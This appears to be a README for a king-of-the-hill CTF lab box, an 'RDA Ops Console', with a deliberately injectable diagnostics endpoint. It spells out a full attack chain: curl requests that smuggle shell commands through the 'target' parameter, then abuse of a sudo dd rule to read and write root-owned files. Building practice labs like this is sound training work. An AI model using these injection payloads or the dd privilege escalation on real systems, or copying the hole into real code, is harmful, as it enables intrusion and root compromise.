# Hill 13 - RDA Ops Console (Avatar) (command injection -> sudo dd)

*Theme: Avatar / RDA.* The sensor diagnostics field is concatenated straight into a shell
command, so it is a **command injection**.

- **Entry:** `GET /diag?target=...` runs `echo probing sensor <target>` in a shell.
  Inject with `;` to run your own commands. Foothold: `ops`. Port 80 (8093 locally).
- **Privesc:** sudoers lets `ops` run `dd` as root (GTFOBins) - `dd` reads and writes any
  file as root: `sudo dd if=/root/root.txt`, `echo ... | sudo dd of=/root/king.txt`.
  Restored on reset.
- **Flags:** `user.txt` (foothold) and `/root/root.txt` (root).

## Attack chain

    # 1. command injection -> user flag
    curl -s -G http://127.0.0.1:8093/diag --data-urlencode 'target=x; cat /home/ops/user.txt'

    # 2. privesc: sudo dd reads root.txt as root
    curl -s -G http://127.0.0.1:8093/diag --data-urlencode \
      'target=x; sudo dd if=/root/root.txt 2>/dev/null'

    # 3. take the hill: sudo dd writes your token to /root/king.txt
    curl -s -G http://127.0.0.1:8093/diag --data-urlencode \
      'target=x; echo TOK-YOUR-TEAM | sudo dd of=/root/king.txt 2>/dev/null'

## Run locally

    docker compose up -d --build   # app: http://localhost:8093/

## Reset behaviour

`reset.sh` restores the `sudo dd` sudoers entry and keeps the server alive. It does **not**
touch `king.txt`.
